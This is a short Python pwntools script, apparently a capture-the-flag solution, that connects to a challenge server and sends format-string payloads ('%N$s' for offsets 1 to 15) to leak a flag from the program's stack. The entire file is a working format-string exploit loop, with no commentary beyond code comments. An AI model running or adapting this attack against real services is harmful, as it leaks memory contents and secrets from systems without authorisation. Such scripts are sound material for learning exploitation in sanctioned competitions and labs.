#!/usr/bin/env python3
from pwn import *

def test_offset(offset):
    try:
        # Create a new connection for each attempt
        p = remote("chals1.apoorvctf.xyz", 3003)
        # Wait until the prompt appears (using bytes)
        p.recvuntil(b"What will you have?")
        # Craft the payload for the given offset
        payload = f"%{offset}$s".encode()
        p.sendline(payload)
        # Use recvall to get all data until the connection closes
        response = p.recvall(timeout=2)
        p.close()
        return response
    except EOFError:
        # If the connection is closed before we receive data, return empty bytes
        return b""

def main():
    flag = None
    # Try offsets 1 through 15 to see which one leaks the flag
    for offset in range(1, 16):
        response = test_offset(offset)
        print(f"Offset {offset}: {response}")
        if b"flag{" in response:
            flag = response
            log.success("Flag found: " + flag.decode(errors="ignore"))
            break
    if flag is None:
        log.error("Flag not found. Adjust the offset range if needed.")

if __name__ == "__main__":
    main()
